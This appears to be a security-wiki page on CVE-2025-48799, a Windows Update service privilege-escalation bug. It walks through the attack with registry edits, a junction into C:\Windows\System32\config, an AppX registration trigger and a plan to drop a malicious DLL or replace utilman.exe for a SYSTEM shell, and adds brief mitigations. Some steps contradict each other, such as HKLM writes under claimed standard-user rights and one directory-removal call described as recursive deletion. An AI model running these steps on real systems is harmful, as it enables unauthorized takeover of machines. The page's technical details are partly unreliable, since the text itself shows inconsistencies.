# Storage Sense Symlink Abuse (Windows Update Service) (CVE-2025-48799)
{{#include /banners/hacktricks-training.md}}


{{#include ../../banners/hacktricks-training.md}}

## Overview

CVE-2025-48799 is a local elevation-of-privilege vulnerability in the Windows Update service (`wuauserv`) on Windows 10/11 systems with multiple physical drives. By abusing Storage Sense’s ability to redirect AppX/MSI staging and cleanup paths, an attacker can create NTFS directory junctions pointing to protected SYSTEM folders. Because the service deletes directories without validating reparse points, it follows the junction and recursively deletes critical system files under SYSTEM privileges, allowing the attacker to drop malicious payloads and achieve SYSTEM code execution.

## Prerequisites

- Windows 10/11 with **two or more** physical drives.
- Standard (non-administrative) user privileges.

## How It Works

1. **Storage Sense Redirection**
   - _UI method_: Launch `ms-settings:storagesense` → “Change where new content is saved” → select a secondary drive (e.g., `D:`).
   - _Registry method_:
     ```powershell
     # Redirect Apps folder
     reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders" /v Apps /t REG_EXPAND_SZ /d "D:\WindowsApps" /f
     # Or set AppxInstallRoot directly
     reg add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\StorageSense" /v AppxInstallRoot /t REG_EXPAND_SZ /d "D:\WindowsApps" /f
     ```

2. **Create Malicious Junction**
   - Redirect `D:\WindowsApps\ExploitPkg` to a protected location (e.g., `C:\Windows\System32\config`):
     ```cmd
     mklink /J "D:\WindowsApps\ExploitPkg" "C:\Windows\System32\config"
     ```
   - Or via PowerShell:
     ```powershell
     New-Item -ItemType Junction -Path "D:\WindowsApps\ExploitPkg" -Target "C:\Windows\System32\config"
     ```
   - Or via Win32 API in C++:
     ```cpp
     CreateSymbolicLinkW(
         L"D:\\WindowsApps\\ExploitPkg",
         L"C:\\Windows\\System32\\config",
         SYMBOLIC_LINK_FLAG_DIRECTORY
     );
     ```

3. **Trigger AppX/MSI Deployment**
   - PowerShell:
     ```powershell
     Add-AppxPackage -Register "D:\WindowsApps\ExploitPkg\AppxManifest.xml"
     ```
   - Or using COM:
     ```cpp
     IAppxPackageManager->AddPackageAsync(
         L"D:\\WindowsApps\\ExploitPkg\\AppxManifest.xml",
         nullptr,
         nullptr,
         nullptr
     );
     ```

4. **Abuse Directory Deletion**
   - The Windows Update service calls:
     ```cpp
     RemoveDirectoryW(L"D:\WindowsApps\<PackageID>\");
     ```
   - It validates **files** with `GetFinalPathByHandle`, but **does not** check reparse points on **directories**. This causes deletion of `C:\Windows\System32\config` contents under SYSTEM privileges.

5. **Deploy Malicious Payload**
   - Race the cleanup using event objects (`WaitForSingleObject`) in C++ PoC.
   - Drop a malicious DLL (e.g., mimic `ntdll.dll`) or replace `utilman.exe` in the cleared folder.
   - Invoke a SYSTEM-loaded process (e.g., Ease of Access executable) to load the attacker-controlled payload.

6. **Gain SYSTEM**
   - A new `cmd.exe` or arbitrary code runs as `NT AUTHORITY\SYSTEM`.

## Proof of Concept

The PoC available in the repository automates:
- Storage Sense redirection via registry APIs (`RegSetValueEx`).
- Junction creation and cleanup triggering.
- Synchronization and race handling using Windows event objects.

Refer to `WinUpdateEoP/WinUpdateEoP.cpp` in the PoC repository for full source code.

## Mitigation & Remediation

- **Reset Storage Sense defaults** to the system drive.
- **Remove unauthorized junctions** under `D:\WindowsApps` or custom AppX roots.
- **Apply the Microsoft security update** released in July 2025.

## References

- [CVE-2025-48799 PoC Repository](https://github.com/Wh04m1001/CVE-2025-48799)
- [ZDI Blog: Abusing Arbitrary File Deletes to Escalate Privilege](https://www.zerodayinitiative.com/blog/2022/3/16/abusing-arbitrary-file-deletes-to-escalate-privilege-and-other-great-tricks)

{{#include ../../banners/hacktricks-training.md}}
